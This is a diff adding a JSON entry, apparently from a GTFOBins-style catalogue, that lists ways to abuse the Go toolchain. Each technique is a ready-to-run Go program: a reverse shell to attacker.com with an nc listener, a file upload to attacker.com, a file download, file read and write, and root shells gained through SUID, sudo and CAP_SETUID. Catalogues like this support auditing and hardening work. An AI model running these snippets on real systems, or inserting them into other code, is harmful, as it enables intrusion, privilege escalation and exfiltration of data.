@@ -1,0 +1,58 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "",
+        "code": "cat > main.go << 'EOF'\npackage main\n\nimport (\n    \"os\"\n    \"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\"/bin/sh\")\n    cmd.Stdin = os.Stdin\n    cmd.Stdout = os.Stdout\n    cmd.Stderr = os.Stderr\n    cmd.Run()\n}\nEOF\ngo run main.go\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run ``nc -lvnp 12345`` on the attacker box to receive the shell.",
+        "code": "export RHOST=attacker.com\nexport RPORT=12345\ncat > main.go << 'EOF'\npackage main\n\nimport (\n    \"net\"\n    \"os\"\n    \"os/exec\"\n)\n\nfunc main() {\n    c, _ := net.Dial(\"tcp\", os.Getenv(\"RHOST\")+\":\"+os.Getenv(\"RPORT\"))\n    cmd := exec.Command(\"/bin/sh\")\n    cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c\n    cmd.Run()\n}\nEOF\ngo run main.go\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send local file via HTTP POST request.",
+        "code": "export URL=http://attacker.com/upload\nexport LFILE=file_to_send\ncat > main.go << 'EOF'\npackage main\n\nimport (\n    \"bytes\"\n    \"net/http\"\n    \"os\"\n)\n\nfunc main() {\n    data, _ := os.ReadFile(os.Getenv(\"LFILE\"))\n    http.Post(os.Getenv(\"URL\"), \"application/octet-stream\", bytes.NewReader(data))\n}\nEOF\ngo run main.go\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file via HTTP GET request.",
+        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ncat > main.go << 'EOF'\npackage main\n\nimport (\n    \"io\"\n    \"net/http\"\n    \"os\"\n)\n\nfunc main() {\n    r, _ := http.Get(os.Getenv(\"URL\"))\n    defer r.Body.Close()\n    f, _ := os.Create(os.Getenv(\"LFILE\"))\n    defer f.Close()\n    io.Copy(f, r.Body)\n}\nEOF\ngo run main.go\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "",
+        "code": "cat > main.go << 'EOF'\npackage main\n\nimport \"os\"\n\nfunc main() {\n    os.WriteFile(\"file_to_write\", []byte(\"DATA\"), 0644)\n}\nEOF\ngo run main.go\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "",
+        "code": "export LFILE=file_to_read\ncat > main.go << 'EOF'\npackage main\n\nimport (\n    \"fmt\"\n    \"os\"\n)\n\nfunc main() {\n    data, _ := os.ReadFile(os.Getenv(\"LFILE\"))\n    fmt.Print(string(data))\n}\nEOF\ngo run main.go\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "",
+        "code": "./go run main.go\n# with the `main.go` containing:\n# os/exec to spawn sh with -p\ncat > main.go << 'EOF'\npackage main\n\nimport (\n    \"os\"\n    \"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\"/bin/sh\", \"-p\")\n    cmd.Stdin = os.Stdin\n    cmd.Stdout = os.Stdout\n    cmd.Stderr = os.Stderr\n    cmd.Run()\n}\nEOF\n./go run main.go\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "",
+        "code": "sudo go run main.go\n# with main.go containing:\ncat > main.go << 'EOF'\npackage main\n\nimport (\n    \"os\"\n    \"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\"/bin/sh\")\n    cmd.Stdin, cmd.Stdout, cmd.Stderr = os.Stdin, os.Stdout, os.Stderr\n    cmd.Run()\n}\nEOF\nsudo go run main.go\n"
+      }
+    ],
+    "capabilities": [
+      {
+        "description": "",
+        "code": "./go run main.go\n# binary must have CAP_SETUID set\ncat > main.go << 'EOF'\npackage main\n\nimport (\n    \"os\"\n    \"os/exec\"\n    \"syscall\"\n)\n\nfunc main() {\n    syscall.Setuid(0)\n    cmd := exec.Command(\"/bin/sh\")\n    cmd.Stdin, cmd.Stdout, cmd.Stderr = os.Stdin, os.Stdout, os.Stderr\n    cmd.Run()\n}\nEOF\n./go run main.go\n"
+      }
+    ]
+  }
+}
